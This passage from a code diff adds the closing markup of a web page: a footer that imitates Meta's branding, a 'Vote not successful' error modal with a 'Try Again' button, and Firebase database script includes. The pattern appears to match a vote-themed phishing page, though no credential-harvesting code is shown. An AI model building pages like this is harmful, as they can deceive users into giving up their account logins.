+                <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                  <a href="#" class="inline-block cursor-pointer hover:underline">English (UK)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Hausa</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Français
+                    (France)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Português
+                    (Brasil)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Español</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">العربية</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Bahasa
+                    Indonesia</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Deutsch</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">日本語</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Italiano</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">हिन्दी</a>
+                </div>
+              </div>
+              <!-- Divider Line -->
+              <hr class="border-gray-300 w-full">
+              <!-- Copyright Section -->
+              <div class="px-2 text-xs text-gray-500">
+                Meta &copy;2025
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </div>
+  </div>
+
+  <!-- Custom Alert -->
+  <div id="custom-alert" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+    <!-- Overlay -->
+    <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()" aria-hidden="true">
+    </div>
+    <!-- Trick to center modal -->
+    <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+    <!-- Error Dialog -->
+    <div id="modal-content"
+      class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+      <!-- Close button -->
+      <div class="absolute top-0 right-0 pt-4 pr-4">
+        <button type="button"
+          class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+          onclick="hideAlert()">
+          <span class="sr-only">Close</span>
+          <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+            </path>
+          </svg>
+        </button>
+      </div>
+      <!-- Modal Content -->
+      <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+        <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
+          <svg class="h-6 w-6 text-red-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 2a10 10 0 110 20 10 10 0 010-20zm-4 8l8 8m0-8l-8 8"></path>
+          </svg>
+        </div>
+        <div class="mt-3 text-center sm:mt-5">
+          <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+            Vote not successful
+          </h3>
+          <div class="mt-2">
+            <p id="alert-message" class="text-sm text-gray-500">
+              Sorry, something went wrong. Please try again.
+            </p>
+          </div>
+        </div>
+        <div class="mt-4 sm:mt-6 sm:flex sm:space-x-6">
+          <button onclick="hideAlert()"
+            class="button w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">
+            Try Again
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src=" https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js">
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="js/firebase.js"></script>
+</body>
+
+</html>
